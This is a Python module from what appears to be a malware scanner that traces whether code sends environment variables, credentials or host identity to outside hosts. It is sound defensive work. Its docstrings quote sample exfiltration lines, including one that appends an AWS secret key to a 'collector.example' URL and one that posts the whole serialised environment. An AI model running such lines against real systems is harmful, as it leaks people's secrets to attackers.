"""What a Python file sends: the whole environment or one named credential to another machine, the
machine's identity, values read from local files, and the environment a child process inherits.
"""

from __future__ import annotations

import ast
from typing import TYPE_CHECKING, Any, ClassVar

from cordon_scanner.analysis.python.pyfacts import (
    DNS_LOOKUPS,
    ENVIRONMENT,
    PRIMITIVES,
    PythonFacts,
)
from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.foundation.capabilities import Capability

if TYPE_CHECKING:
    from collections.abc import Callable


from cordon_scanner.analysis.python.flows.hidden_destinations import HiddenDestinations
from cordon_scanner.analysis.python.flows.secret_sources import SecretSources

#: Methods of a mapping that return one value, not the mapping.
KEYED_METHODS = frozenset({"get", "setdefault", "pop", "__getitem__", "__contains__"})

#: Calls that start a child process, by module and function. Their `env=` is the child's.
SPAWNS: frozenset[tuple[str, str]] = frozenset(
    {
        ("subprocess", "Popen"),
        ("subprocess", "run"),
        ("subprocess", "call"),
        ("subprocess", "check_call"),
        ("subprocess", "check_output"),
        ("asyncio", "create_subprocess_exec"),
        ("asyncio", "create_subprocess_shell"),
    }
)


class EnvironmentCarry:
    """`carried` for the whole environment, keyed-read aware. Same signature as
    `PythonFacts.carried`'s result: `holds(node, deep=True)`.

    Which expressions hold the whole environment, as opposed to one setting read from it.

    `PythonFacts.carried` answers "does this expression contain the source anywhere", which is right
    for a hostname and wrong for a mapping: `env.get("KEY")` contains `env` and yields one value. Read
    that way, `environ = os.environ if environ is None else environ` followed by `environ.get(name)`
    sent "the whole environment" with every request the file made (reviews/pypi-98/
    17-EXFIL-SCANNER-ERRORS.md: nine legitimate packages, three shapes).

    Here an expression is whole when it can carry every variable:

    * `os.environ` itself, a name assigned from a whole value, a parameter a whole value is handed to;
    * a container, a spread (`{**env}`), a comprehension over one, or a method that is not a keyed read
      (`env.items()`, `env.copy()`), or any call this file cannot see into with a whole argument;
    * a call to a function of this file that returns a whole value, or that is handed one and does
      anything with it but read single keys.

    It is one value when it is a keyed read of a whole value -- `env[k]`, `env.get(k)`,
    `env.setdefault(k)`, `env.pop(k)`, a bound keyed method (`E = os.environ.get; E(k)`), or
    `os.environ(k)` written as a call -- and nothing else. `k in env` steering control flow is
    never a sent value; sent itself, it tells what the environment holds and counts. A helper that
    only reads keys from what it is handed returns one value; one that passes it anywhere else,
    encodes it or returns it stays whole, and an unknown callee always does.
    """

    @classmethod
    def carried(
        cls,
        tree: ast.AST,
        is_environ: Callable[[ast.AST], bool],
        spawns: Callable[[ast.Call], bool] | None = None,
    ) -> Callable[..., bool]:
        """`is_environ(node)`: whether a node is `os.environ` (or `os.environb`) as a value.
        `spawns(call)`: whether a call starts a child process, resolved through the file's
        imports by the caller; `is_spawn` (no imports) when not given."""
        starts_child = spawns or cls.is_spawn
        scope = PythonSyntax.name_scope(tree)
        passed = PythonSyntax.passed(tree)
        functions: dict[str, ast.FunctionDef | ast.AsyncFunctionDef] = {
            f.name: f for f in PythonSyntax.of(tree, ast.FunctionDef, ast.AsyncFunctionDef)
        }
        carrying: set[tuple[int, str]] = set()
        returning: set[str] = set()

        def whole(node: ast.AST) -> bool:
            if is_environ(node):
                return True
            if isinstance(node, ast.Name):
                return (scope(node, node.id), node.id) in carrying
            if isinstance(node, ast.Subscript):
                return not whole(node.value) and whole(node.slice)
            shaped = cls._by_shape(node, whole)
            if shaped is not None:
                return shaped
            if isinstance(node, ast.Call):
                return call_whole(node)
            return any(whole(child) for child in ast.iter_child_nodes(node))

        def call_whole(call: ast.Call) -> bool:
            func = call.func
            if is_environ(func):
                return False  # `os.environ("KEY")`: one value, if it runs at all
            if isinstance(func, ast.Attribute) and whole(func.value):
                return func.attr not in KEYED_METHODS
            # A child process's `env=` is consumed by the child: the Popen or CompletedProcess
            # that comes back is not the environment (pull-request-view, review 2026-11-09).
            spawned = starts_child(call)
            arguments = [
                *call.args,
                *(k.value for k in call.keywords if not (spawned and k.arg == "env")),
            ]
            name = cls._callee(call)
            local = functions.get(name) if name is not None else None
            if local is None:
                return any(whole(a) for a in arguments) or whole(func)
            if name in returning:
                return True
            return any(
                whole(argument) and not cls._reads_keys_only(local, param, functions, whole, set())
                for argument, param in cls._bindings(call, local)
            )

        for _ in range(3):
            carrying.update((function, param) for arg, function, param in passed if whole(arg))
            for node in PythonSyntax.nodes(tree):
                if isinstance(node, ast.Assign) and whole(node.value):
                    carrying.update(
                        (scope(t, t.id), t.id) for t in node.targets if isinstance(t, ast.Name)
                    )
                elif (
                    isinstance(node, ast.AnnAssign)
                    and node.value is not None
                    and isinstance(node.target, ast.Name)
                    and whole(node.value)
                ):
                    carrying.add((scope(node.target, node.target.id), node.target.id))
            for function in functions.values():
                if function.name not in returning and any(
                    part.value is not None and whole(part.value)
                    for part in PythonSyntax.within(function, ast.Return)
                ):
                    returning.add(function.name)

        def holds(node: ast.AST, *, deep: bool = True) -> bool:
            del deep  # a mapping is held structurally, never by containment alone
            return whole(node)

        return holds

    @staticmethod
    def _by_shape(node: ast.AST, whole: Callable[[ast.AST], bool]) -> bool | None:
        """What a node's own shape decides, None where its parts do (review 2026-11-10).

        * `E = os.environ.get`: a bound keyed method reads one setting per call; it is not the
          environment (delegate-router). `items = os.environ.items` still is.
        * An if-expression's value is one of its branches, never its test: `url = default if
          "URL" not in os.environ else os.environ["URL"]` (c2cciutils, Finance-Ultron).
        * A comparison is one bool, never the environment: `{"ci": "CI" in env}` is a CI flag,
          the shape of Rasa's Segment telemetry (convo-new-version-abdo). Host identity sent
          unasked from an import, runtime-readout's beacon, is the beacon rules' finding
          (`SUSPECT/MALWARE.EXFIL.BEACON.001`), not this fact's.
        """
        if isinstance(node, ast.Attribute) and node.attr in KEYED_METHODS and whole(node.value):
            return False
        if isinstance(node, ast.IfExp):
            return whole(node.body) or whole(node.orelse)
        if isinstance(node, ast.Compare):
            return False
        return None

    @staticmethod
    def is_spawn(call: ast.Call) -> bool:
        """`subprocess.Popen(...)` and its kin, or `Popen(...)` imported bare."""
        func = call.func
        if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
            return (func.value.id, func.attr) in SPAWNS
        return isinstance(func, ast.Name) and func.id in {"Popen", "check_output", "check_call"}

    @staticmethod
    def _callee(call: ast.Call) -> str | None:
        func = call.func
        if isinstance(func, ast.Name):
            return func.id
        if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
            return func.attr
        return None

    @staticmethod
    def _bindings(
        call: ast.Call, function: ast.FunctionDef | ast.AsyncFunctionDef
    ) -> list[tuple[ast.AST, str | None]]:
        """Each argument with the parameter it binds; None when it binds none this can name
        (`*args`, `**kwargs`, a starred argument), which `_reads_keys_only` treats as unknown."""
        params = [a.arg for a in (*function.args.posonlyargs, *function.args.args)]
        if isinstance(call.func, ast.Attribute) and params[:1] in (["self"], ["cls"]):
            params = params[1:]
        out: list[tuple[ast.AST, str | None]] = []
        for index, argument in enumerate(call.args):
            starred = isinstance(argument, ast.Starred)
            out.append((argument, None if starred or index >= len(params) else params[index]))
        known = {*params, *(a.arg for a in function.args.kwonlyargs)}
        out.extend((k.value, k.arg if k.arg in known else None) for k in call.keywords)
        return out

    @classmethod
    def _reads_keys_only(
        cls,
        function: ast.FunctionDef | ast.AsyncFunctionDef,
        param: str | None,
        functions: dict[str, ast.FunctionDef | ast.AsyncFunctionDef],
        is_whole: Callable[[ast.AST], bool],
        seen: set[tuple[str, str]],
    ) -> bool:
        """Whether every use of `param` in `function` reads a single key from it.

        Allowed: `p[k]`, `p.get(k)` and its kin, `k in p`, `p is None`, rebinding it to itself
        or the environment (`p = os.environ if p is None else p`), and handing it to a function
        of this file whose parameter is used the same way. Anything else -- returned, iterated,
        spread, serialised, handed to a function this file cannot see -- is not. `seen` stops a
        recursion through mutually calling helpers, answering "not keyed-only" when it loops."""
        if param is None or (function.name, param) in seen:
            return False
        seen.add((function.name, param))
        parents = PythonSyntax.parents(function)
        for use in (n for n in PythonSyntax.within(function, ast.Name) if n.id == param):
            parent = parents.get(id(use))
            if isinstance(use.ctx, ast.Store):
                if cls._rebinds_to_itself(parent, use, param, is_whole):
                    continue
                return False
            if not isinstance(use.ctx, ast.Load):
                return False
            if cls._keyed_use(use, parent, parents) or cls._is_none_check(use, parent):
                continue
            if cls._self_or_environ(parent, param, is_whole, use, parents):
                continue
            if (isinstance(parent, ast.Call) and use in parent.args) or isinstance(
                parent, ast.keyword
            ):
                call = parent if isinstance(parent, ast.Call) else parents.get(id(parent))
                name = cls._callee(call) if isinstance(call, ast.Call) else None
                local = functions.get(name) if name is not None else None
                if local is not None and isinstance(call, ast.Call):
                    bound = {id(a): p for a, p in cls._bindings(call, local)}
                    if cls._reads_keys_only(local, bound.get(id(use)), functions, is_whole, seen):
                        continue
            return False
        return True

    @staticmethod
    def _keyed_use(use: ast.Name, parent: ast.AST | None, parents: dict[int, ast.AST]) -> bool:
        if isinstance(parent, ast.Subscript) and parent.value is use:
            return True
        if isinstance(parent, ast.Compare) and use in parent.comparators:
            return all(isinstance(op, (ast.In, ast.NotIn)) for op in parent.ops)
        return (
            isinstance(parent, ast.Attribute)
            and parent.value is use
            and parent.attr in KEYED_METHODS
            and isinstance(parents.get(id(parent)), ast.Call)
        )

    @staticmethod
    def _is_none_check(use: ast.Name, parent: ast.AST | None) -> bool:
        return (
            isinstance(parent, ast.Compare)
            and parent.left is use
            and all(isinstance(op, (ast.Is, ast.IsNot)) for op in parent.ops)
            and all(isinstance(c, ast.Constant) and c.value is None for c in parent.comparators)
        )

    @staticmethod
    def _self_or_environ(
        node: ast.AST | None,
        param: str,
        is_whole: Callable[[ast.AST], bool],
        use: ast.Name,
        parents: dict[int, ast.AST],
    ) -> bool:
        """`use` is a branch of `p if p is not None else os.environ` or `p or os.environ` that is
        itself assigned back to `p`: the same mapping under the same name."""
        if not isinstance(node, (ast.IfExp, ast.BoolOp)):
            return False
        assign = parents.get(id(node))
        if not (
            isinstance(assign, ast.Assign)
            and len(assign.targets) == 1
            and isinstance(assign.targets[0], ast.Name)
            and assign.targets[0].id == param
        ):
            return False
        branches = [node.body, node.orelse] if isinstance(node, ast.IfExp) else node.values
        return use in branches and all(
            (isinstance(b, ast.Name) and b.id == param) or is_whole(b) for b in branches
        )

    @classmethod
    def _rebinds_to_itself(
        cls,
        assign: ast.AST | None,
        target: ast.Name,
        param: str,
        is_whole: Callable[[ast.AST], bool],
    ) -> bool:
        """`p = os.environ if p is None else p`, `p = p or os.environ`, `p = self.environ()` when
        that returns the whole environment: still a whole mapping, still read only by key."""
        if not isinstance(assign, ast.Assign) or assign.targets != [target]:
            return False
        value = assign.value
        if isinstance(value, ast.IfExp):
            branches = [value.body, value.orelse]
        elif isinstance(value, ast.BoolOp):
            branches = list(value.values)
        else:
            return is_whole(value)
        return all((isinstance(b, ast.Name) and b.id == param) or is_whole(b) for b in branches)


__all__ = ["KEYED_METHODS", "SPAWNS", "EnvironmentCarry"]


class DataFlows(SecretSources, HiddenDestinations):
    """The Python analyser's data flows: what a file reads and sends."""

    def _environment_handed_to_children(self, tree: ast.AST) -> frozenset[int]:
        """`os.environ` nodes whose whole-environment copy only ever becomes a child's environment.

        `env = os.environ.copy(); env.update(extra); subprocess.call(cmd, env=env)` -- nodeenv,
        and every build script that sets one variable for a compiler. The copy is the parent's
        environment handed to its own child, which inherits it anyway; nothing is read out of
        it. Accepted holders: `X = os.environ.copy()`, `X = dict(os.environ, ...)`,
        `X = {**os.environ, ...}`, `X.update(os.environ)`, or the read written straight into
        `env=`. Every other use of the holder -- serialised, sent, iterated, returned -- keeps
        the read a whole-environment read.
        """
        # Kept with the tree (`PythonSyntax.memo`): three passes ask, and the answer depends only
        # on the tree and its name tables, which are complete before any of them runs.
        handed: frozenset[int] = PythonSyntax.memo(tree, "handed", lambda: self._handed(tree))
        return handed

    def _handed(self, tree: ast.AST) -> frozenset[int]:
        # Keyed by (enclosing function, name): `env` is the usual name, and one function's
        # hand-off says nothing about what another function does with its own `env`.
        environ_nodes: dict[tuple[int, str], list[int]] = {}
        direct: set[int] = set()
        parents = PythonSyntax.parents(tree)

        def scope_of(node: ast.AST) -> ast.AST:
            current = parents.get(id(node))
            while current is not None and not isinstance(
                current, ast.FunctionDef | ast.AsyncFunctionDef | ast.Lambda
            ):
                current = parents.get(id(current))
            return current if current is not None else tree

        def is_environ(node: ast.AST) -> bool:
            return self._dotted(node) in ENVIRONMENT

        # Only the node types `_dotted` can name; every other node is not `os.environ`.
        for node in PythonSyntax.of(tree, ast.Name, ast.Attribute, ast.Call):
            if not is_environ(node):
                continue
            parent = parents.get(id(node))
            copy: ast.AST | None = None
            if isinstance(parent, ast.Attribute) and parent.attr == "copy":
                call = parents.get(id(parent))
                copy = call if isinstance(call, ast.Call) and call.func is parent else None
            elif (
                isinstance(parent, ast.Call)
                and isinstance(parent.func, ast.Name)
                and parent.func.id == "dict"
                and parent.args
                and parent.args[0] is node
            ) or (isinstance(parent, ast.Dict) and None in parent.keys):
                copy = parent
            elif (
                isinstance(parent, ast.Call)
                and isinstance(parent.func, ast.Attribute)
                and parent.func.attr == "update"
                and isinstance(parent.func.value, ast.Name)
            ):
                environ_nodes.setdefault((id(scope_of(node)), parent.func.value.id), []).append(
                    id(node)
                )
                continue
            elif self._child_env(parent, parents):
                direct.add(id(node))
                continue
            if copy is None:
                continue
            holder = parents.get(id(copy))
            if self._child_env(holder, parents):
                direct.add(id(node))
            elif (
                isinstance(holder, ast.Assign)
                and len(holder.targets) == 1
                and isinstance(holder.targets[0], ast.Name)
            ):
                environ_nodes.setdefault((id(scope_of(node)), holder.targets[0].id), []).append(
                    id(node)
                )

        excused = set(direct)
        for (scope, name), nodes in environ_nodes.items():
            uses = [
                n
                for n in PythonSyntax.of(tree, ast.Name)
                if n.id == name and isinstance(n.ctx, ast.Load) and id(scope_of(n)) == scope
            ]
            if uses and all(self._harmless_use(use, parents) for use in uses):
                excused.update(nodes)
        return frozenset(excused)

    def _spawns(self, call: ast.Call) -> bool:
        """Whether a call starts a child process, resolved through this file's imports
        (`from subprocess import run` included): a spawn primitive, or `SPAWNS`."""
        resolved = self._resolve_callee(call)
        if resolved is not None and PRIMITIVES.get(resolved[0]) is Capability.SPAWN:
            return True
        return EnvironmentCarry.is_spawn(call)

    def _child_env(self, node: ast.AST | None, parents: dict[int, ast.AST]) -> bool:
        """`env=` of a call that starts a child process. The same keyword on any other callee is
        an argument like any other, and is followed: a function named anything can be handed
        `env=dict(os.environ)` and send it (review 2026-11-09)."""
        if not (isinstance(node, ast.keyword) and node.arg == "env"):
            return False
        call = parents.get(id(node))
        return isinstance(call, ast.Call) and self._spawns(call)

    def _harmless_use(self, use: ast.Name, parents: dict[int, ast.AST]) -> bool:
        parent = parents.get(id(use))
        if self._child_env(parent, parents):
            return True
        if isinstance(parent, ast.Attribute) and parent.value is use:
            return parent.attr in {"update", "setdefault", "pop", "get", "copy", "__setitem__"}
        if isinstance(parent, ast.Subscript) and parent.value is use:
            return True
        if isinstance(parent, ast.Assign) and parent.value is use:
            return all(
                isinstance(t, ast.Subscript) and PythonFacts.constant(t.slice) == "env"
                for t in parent.targets
            )
        if isinstance(parent, ast.Dict):
            index = next((i for i, v in enumerate(parent.values) if v is use), None)
            key = parent.keys[index] if index is not None else None
            return key is not None and PythonFacts.constant(key) == "env"
        return False

    def _iterated_literals(self, tree: ast.AST) -> dict[str, list[str]]:
        """Loop variables whose every value is a string literal, with those values, and names bound
        once to one string literal.

        From `for n in (...)` and comprehensions, iterating either a literal tuple or list, or a
        name bound once to one. A name used as a loop variable twice, over different things, is
        left out rather than guessed at."""
        sequences: dict[str, list[str]] = {}
        assigned: dict[str, int] = {}
        for node in PythonSyntax.of(tree, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    assigned[target.id] = assigned.get(target.id, 0) + 1
                    values = PythonFacts.literal_strings(node.value)
                    if values is not None:
                        sequences[target.id] = values

        def resolved(iterable: ast.AST) -> list[str] | None:
            values = PythonFacts.literal_strings(iterable)
            if values is None and isinstance(iterable, ast.Name) and assigned.get(iterable.id) == 1:
                values = sequences.get(iterable.id)
            return values

        found: dict[str, list[str]] = {}
        refused: set[str] = set()
        for node in PythonSyntax.of(tree, ast.For, ast.comprehension):
            if isinstance(node.target, ast.Name):
                name = node.target.id
                values = resolved(node.iter)
                if values is None or (name in found and found[name] != values):
                    refused.add(name)
                else:
                    found[name] = values
        # A name bound once in the file to one string literal, and never a parameter, is that
        # string: `DO_NOT_TRACK_ENV = "DO_NOT_TRACK"; os.environ.get(DO_NOT_TRACK_ENV)` reads
        # one named setting, not the environment (evidently 0.7.23's telemetry opt-out was
        # graded a credential read and paired at import into MALWARE.EXFIL.001).
        parameters = {a.arg for a in PythonSyntax.of(tree, ast.arg)}
        for node in PythonSyntax.of(tree, ast.Assign):
            if (
                len(node.targets) == 1
                and isinstance(node.targets[0], ast.Name)
                and isinstance(node.value, ast.Constant)
                and isinstance(node.value.value, str)
            ):
                name = node.targets[0].id
                if assigned.get(name) == 1 and name not in parameters and name not in found:
                    found[name] = [node.value.value]
        return {name: values for name, values in found.items() if name not in refused}

    def _handed_to_a_sender(
        self, tree: ast.AST, holds: Callable[..., bool]
    ) -> list[tuple[ast.Call, str]]:
        """Calls that hand what `holds` finds to a function of this file whose parameter reaches a
        request: `send(gather())` where `def send(data): requests.post(URL, data=json.dumps(data))`.

        The other half of `_carried`: a collector and a sender written as two functions, joined
        at the call (review 98, MalSkillBench). A lookup of the parameter itself
        (`def resolve(name): return socket.gethostbyname(name)`) is not a sender -- that is how
        a machine's own name is resolved; a name BUILT from it, as DNS exfiltration does, is.
        """
        senders: dict[str, tuple[list[str], set[str]]] = {}
        for function in PythonSyntax.of(tree, ast.FunctionDef, ast.AsyncFunctionDef):
            arguments = function.args
            params = [a.arg for a in (*arguments.posonlyargs, *arguments.args)]
            params += [a.arg for a in arguments.kwonlyargs]
            reaching: dict[str, set[str]] = {name: {name} for name in params}
            for _ in range(2):
                for assign in PythonSyntax.within(function, ast.Assign):
                    found = {
                        param
                        for part in PythonSyntax.within(assign.value, ast.Name)
                        for param in reaching.get(part.id, ())
                    }
                    for target in assign.targets:
                        if found and isinstance(target, ast.Name):
                            reaching.setdefault(target.id, set()).update(found)
            sent: set[str] = set()
            for call in PythonSyntax.within(function, ast.Call):
                resolved = self._resolve_callee(call)
                if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                    continue
                values = [*call.args, *(k.value for k in call.keywords)]
                if resolved[0] in DNS_LOOKUPS and values and isinstance(values[0], ast.Name):
                    values = values[1:]
                sent.update(
                    param
                    for value in values
                    for part in PythonSyntax.within(value, ast.Name)
                    for param in reaching.get(part.id, ())
                )
            if sent:
                senders[function.name] = (params, sent)

        sends: list[tuple[ast.Call, str]] = []
        if not senders:
            return sends
        for call in PythonSyntax.of(tree, ast.Call):
            func = call.func
            name = (
                func.id
                if isinstance(func, ast.Name)
                else func.attr
                if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name)
                else None
            )
            if name not in senders:
                continue
            params, sent = senders[name]
            # A method called on an instance or a class: its first parameter is that object.
            offset = (
                1 if isinstance(func, ast.Attribute) and params[:1] in (["self"], ["cls"]) else 0
            )
            handed = [
                (params[index + offset], value)
                for index, value in enumerate(call.args)
                if index + offset < len(params)
            ] + [(k.arg, k.value) for k in call.keywords if k.arg]
            if any(param in sent and holds(value) for param, value in handed):
                sends.append((call, name))
        return sends

    def _identity_sent(self, tree: ast.AST) -> None:
        """The machine's identity, in the arguments of a request.

        `requests.post(URL, json={"user": getpass.getuser(), "host": socket.gethostname()})`, or
        the same through a variable. Reading a hostname and making a request somewhere in the same
        thirty lines is what a telemetry plugin, a socket demo and a browser installer all do;
        putting the hostname in the request is the probe.
        """
        self._identity_runners = self._helper_runners(
            list(PythonSyntax.of(tree, ast.FunctionDef, ast.AsyncFunctionDef))
        )
        holds = PythonFacts.carried(tree, self._is_recon_call, ast.Subscript)
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            if resolved[0] in DNS_LOOKUPS and all(holds(a, deep=False) for a in node.args[:1]):
                # Looking up this machine's own name sends it to a resolver, not to anyone
                # who collects it; a name built into another domain is what DNS exfiltration is.
                continue
            if any(holds(argument) for argument in arguments):
                self._record(
                    Capability.RECONNAISSANCE,
                    node,
                    f"identity sent: {resolved[0]}{self._dest(tree, resolved[1])}",
                )
        for node, function in self._handed_to_a_sender(tree, holds):
            self._record(Capability.RECONNAISSANCE, node, f"identity sent: through {function}")

    def _environment_sent(self, tree: ast.AST) -> None:
        """The whole environment, in the arguments of a request.

        `urlopen(URL, json.dumps(dict(os.environ)).encode())`, or the same through a variable:
        every token and secret the process can see, serialised and sent in one call. Reading one
        named setting and calling its service is what every API client does; sending all of them
        is the commonest exfiltration in published malware. A keyed read (`os.environ["KEY"]`,
        `os.getenv("KEY")`, `env.get("KEY")` on an alias, a helper that only reads keys) is not
        the whole environment, nor is a copy handed to a child process, which inherits it anyway.
        Which expressions are whole: `EnvironmentCarry`.
        """
        handed_on = self._environment_handed_to_children(tree)

        def is_environ(node: ast.AST) -> bool:
            return self._dotted(node) in ("os.environ", "os.environb") and id(node) not in handed_on

        holds = EnvironmentCarry.carried(tree, is_environ, self._spawns)
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            if any(holds(argument) for argument in arguments):
                self._record(
                    Capability.CREDENTIAL,
                    node,
                    f"environment sent: {resolved[0]}{self._dest(tree, resolved[1])}",
                )
        for node, function in self._handed_to_a_sender(tree, holds):
            self._record(Capability.CREDENTIAL, node, f"environment sent: through {function}")

    def _secret_sent(self, tree: ast.AST) -> None:
        """One named credential, in a request to a host outside the credential's home.

        `urlopen("https://collector.example/?k=" + os.environ["AWS_SECRET_ACCESS_KEY"])`, or the
        value through a variable, or the URL through one. See `analysis/shared/credential_homes.py` for what a
        home is and why a host the file does not write down is never judged.
        """
        from cordon_scanner.analysis.shared.credential_homes import SecretFlow

        carrying, urls = self._secret_carrying(tree)
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            keys: set[str] = set()
            for argument in arguments:
                # `private_key.public_key()` sends what the key derives, not the key: a key's name
                # is the value only where it is not the receiver of an attribute.
                receivers = {id(a.value) for a in PythonSyntax.within(argument, ast.Attribute)}
                for part in PythonSyntax.within(
                    argument, ast.Subscript, ast.Call, ast.Name, ast.Attribute
                ):
                    if (
                        isinstance(part, ast.Name)
                        and part.id in self.KEY_NAMES
                        and id(part) in receivers
                    ):
                        continue
                    key = self._credential_read(part)
                    if key is None and isinstance(part, ast.Name) and part.id in carrying:
                        key = carrying[part.id]
                    if key is not None:
                        keys.add(key)
            if not keys:
                continue
            destination = (
                node.args[0]
                if node.args
                else next(
                    (k.value for k in node.keywords if k.arg in ("url", "uri", "host", "address")),
                    None,
                )
            )
            host: str | None = None
            url: str | None = None
            if destination is not None:
                literal = PythonFacts.url_literal(destination)
                if literal is not None:
                    host, url = SecretFlow.host_of(literal), literal
                elif isinstance(destination, ast.Name):
                    host = urls.get(destination.id)
            dest = self._dest(tree, node)
            for key in sorted(keys):
                if key.startswith("CREDENTIAL_FILE:"):
                    # A credential store's contents, sent outside the store's home
                    # (`SecretSources._store_outside`).
                    outside = self._store_outside(key, host, url, bool(dest))
                    if outside is not None:
                        self._record(
                            Capability.CREDENTIAL,
                            node,
                            f"secret sent: CREDENTIAL_FILE outside={outside} to {host or '?'}{dest}",
                        )
                        break
                elif SecretFlow.misdirected(key, host):
                    self._record(Capability.CREDENTIAL, node, f"secret sent: {key} to {host}{dest}")
                    break

    def _read_from_local_file(self, node: ast.AST) -> bool:
        """Whether every name in this expression holds text read from a local file, rather than
        from anywhere that could be remote."""
        names = [n.id for n in PythonSyntax.within(node, ast.Name)]
        return bool(names) and all(name in self._local_reads for name in names)

    def _loads_a_bundled_file(self, node: ast.Call, dotted: str) -> bool:
        """`torch.load(os.path.join(os.path.dirname(__file__), "model.pt"), weights_only=False)`:
        a pickle shipped beside the module, deserialised -- which runs whatever the pickle names.

        `torch.load` counts only with `weights_only=False` written out, the switch that turns its
        safe loader off. The pickle-family loaders have no safe mode, so for them a path built from
        `__file__` is enough. A path from anywhere else is a user's own file, which is what these
        loaders are for."""
        if dotted == "torch.load":
            unsafe = any(
                k.arg == "weights_only"
                and isinstance(k.value, ast.Constant)
                and k.value.value is False
                for k in node.keywords
            )
            if not unsafe:
                return False
        argument = node.args[0] if node.args else None
        if argument is None:
            return False
        if isinstance(argument, ast.Call) and self._dotted(argument.func) == "open":
            argument = argument.args[0] if argument.args else argument
        names = {n.id for n in PythonSyntax.within(argument, ast.Name)}
        if isinstance(argument, ast.Name) and argument.id in self._bundled_paths:
            return True
        return "__file__" in names

    #: Where `_keyed_environment_reads` finds a read with one literal key, by the method that
    #: finds it at each kind of node.
    _KEYED: ClassVar[dict[type[ast.AST], str]] = {
        ast.Subscript: "_keyed_subscript",
        ast.Call: "_keyed_call",
        ast.Compare: "_keyed_compare",
    }

    def _keyed_subscript(self, node: ast.Subscript, candidates: Any, keyed: dict[int, str]) -> None:
        # `os.environ["NAME"]`
        key = self._key_of(node.slice, candidates)
        if key is not None and self._dotted(node.value) in ENVIRONMENT:
            keyed[id(node.value)] = key

    def _keyed_call(self, node: ast.Call, candidates: Any, keyed: dict[int, str]) -> None:
        key = self._key_of(node.args[0], candidates) if node.args else None
        if key is None:
            return
        if self._dotted(node.func) in ENVIRONMENT:
            # `os.getenv("NAME")`. Mapped against the function node,
            # because the walk reaches that as a bare `Attribute` too and
            # would record it whatever `_call` decided.
            keyed[id(node.func)] = key
        elif (
            isinstance(node.func, ast.Attribute)
            and node.func.attr in {"get", "setdefault", "pop"}
            and self._dotted(node.func.value) in ENVIRONMENT
        ):
            # `os.environ.get("NAME")`, and the two methods that read the
            # same way.
            keyed[id(node.func.value)] = key

    def _keyed_compare(self, node: ast.Compare, candidates: Any, keyed: dict[int, str]) -> None:
        # `"NAME" in os.environ` asks whether one setting is present and
        # obtains no value at all, so it is a weaker act than any of the
        # keyed reads above. It reached none of them: a `Compare` names no
        # key, registered nothing, and so the bare-`Attribute` branch of
        # the walk saw an unkeyed `os.environ` and called it
        # whole-environment access -- the broadest reading available, for
        # the narrowest act there is.
        #
        # `saltstack/salt` writes `if "WRITE_SALT_VERSION" in os.environ`
        # three times in its `setup.py` and `if "SALT_VERSION" in
        # os.environ` in `salt/version.py`. Both files are install-time by
        # definition and both reach the network, so both were
        # `MALWARE.EXFIL.001` at CRITICAL -- "reads credentials and
        # transmits them" -- for build flags that gate a version string.
        #
        # Judged by the name, like every other keyed read, rather than by
        # a second rule of its own. A presence test on a name that reads
        # as a credential is still worth the label, because code that asks
        # whether a token is set is code that means to use it, and the
        # read itself is its own hit wherever it happens.
        left: ast.expr = node.left
        for op, comparator in zip(node.ops, node.comparators, strict=True):
            if isinstance(op, ast.In | ast.NotIn) and (self._dotted(comparator) in ENVIRONMENT):
                key = PythonFacts.constant(left)
                if key is not None:
                    keyed[id(comparator)] = key
            left = comparator

    def _keyed_environment_reads(self, tree: ast.AST) -> dict[int, str]:
        """Environment nodes that are read with one literal key, and that key.

        The judgement has to be made at the PARENT: `os.environ` and
        `os.environ["PATH"]` contain the same `Attribute` node, so the bare-name
        branch of the walk cannot tell a whole-environment read from a single
        setting without looking up. A node absent from this map was either used
        as a whole mapping -- passed somewhere, copied, iterated, unpacked -- or
        subscripted with something computed, and both of those are the broad
        access.
        """
        keyed: dict[int, str] = {}
        written: set[int] = set()
        for node in PythonSyntax.of(tree, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Subscript) and self._dotted(target.value) in ENVIRONMENT:
                    # `os.environ["X"] = "1"` SETS a variable. Reading the
                    # environment is what this primitive is about, and a Google
                    # Workspace setup script in `NousResearch/hermes-agent` was
                    # reported for exfiltration on the strength of
                    # `os.environ["OAUTHLIB_RELAX_TOKEN_SCOPE"] = "1"`.
                    written.add(id(target.value))

        candidates = self._iterated_literals(tree)
        for node_id in self._environment_handed_to_children(tree):
            keyed[node_id] = ""

        for node in PythonSyntax.of(tree, *self._KEYED):
            getattr(self, self._KEYED[type(node)])(node, candidates, keyed)
        for node_id in written:
            # A written name is not a read at all, whatever the name says.
            keyed[node_id] = ""
        return keyed

    def _key_of(self, node: ast.AST, candidates: dict[str, list[str]]) -> str | None:
        # A literal, or a loop variable drawn from a literal sequence of names --
        # `for n in ("http_proxy", "HTTPS_PROXY"): os.environ[n]`, which is how nodeenv
        # passes proxy settings on. Every candidate is judged, joined, so one name that
        # reads as a credential keeps the read a credential read.
        key = PythonFacts.constant(node)
        if key is None and isinstance(node, ast.Name) and node.id in candidates:
            return " ".join(candidates[node.id])
        return key


__all__ = ["DataFlows"]
